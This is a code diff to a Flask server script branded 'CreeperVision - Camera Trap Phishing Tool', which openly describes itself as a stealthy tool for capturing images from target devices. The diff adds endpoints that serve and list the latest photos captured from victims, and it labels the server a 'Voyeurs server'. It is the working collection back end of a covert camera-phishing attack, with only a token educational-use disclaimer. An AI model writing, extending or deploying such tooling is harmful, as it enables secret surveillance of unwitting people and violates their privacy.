@@ -1,7 +1,24 @@
+#!/usr/bin/env python3
+#
+#  ________                                 _      _____  _                     
+# /  ___ | |                               | |    |____ || |                    
+# `---. \| |__  _ __  ___  __ _  _ __    __| | _ __    / /| |__    __ _  _ __  
+#     \ \|  _ \|  __|/ _ \/ _  ||  _ \  / _  ||  _ \   \ \|  _ \  / _  ||  _ \ 
+#/\__/ /| | | | |  |  __/ (_| || | | || (_| || |_) |.__/ /| | | || (_| || | | |
+#\____/ |_| |_|_|   \___|\__,_||_| |_| \__,_||  __/ \____/ |_| |_| \__,_||_| |_|
+#                                            | |                              
+#                                            |_|                              
+#
+# CreeperVision - Camera Trap Phishing Tool
+# A stealthy surveillance tool that captures images from target devices
+#
+# WARNING: This tool is for educational purposes only.
+# Please use responsibly and only on systems you own or have explicit permission to test.
+# 请勿用于非法用途！
 
 import argparse
 import os
-from flask import Flask, request, render_template, redirect, url_for
+from flask import Flask, request, render_template, redirect, url_for, send_from_directory
 from werkzeug.utils import secure_filename
 import threading
 import time
@@ -39,8 +56,29 @@ def upload_image():
         return 'Image saved successfully', 200
 
 
+@app.route('/uploads/<filename>')
+def uploaded_file(filename):
+    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
+
+
+@app.route('/api/photos')
+def list_photos():
+    """API endpoint to list all captured photos"""
+    try:
+        photos = []
+        if os.path.exists(app.config['UPLOAD_FOLDER']):
+            for file in os.listdir(app.config['UPLOAD_FOLDER']):
+                if file.endswith('.jpg'):
+                    photos.append(file)
+            # Sort by modification time, newest first
+            photos.sort(key=lambda x: os.path.getmtime(os.path.join(app.config['UPLOAD_FOLDER'], x)), reverse=True)
+        return {'photos': photos[:10]}  # Return only the 10 newest photos
+    except Exception as e:
+        return {'error': str(e)}, 500
+
+
 def run_server(port):
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)
 
 
 if __name__ == '__main__':
@@ -60,12 +98,13 @@ if __name__ == '__main__':
     server_thread.daemon = True
     server_thread.start()
     
-    # Print the server URL
-    print(f"Server running on http://localhost:{port}")
+    # Print server information
+    print(f"Voyeurs server started at http://0.0.0.0:{port}")
+    print("Press Ctrl+C to stop the server")
     
     # Keep the main thread alive
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print("\\nServer stopped.")
+        print("\nServer stopped.")
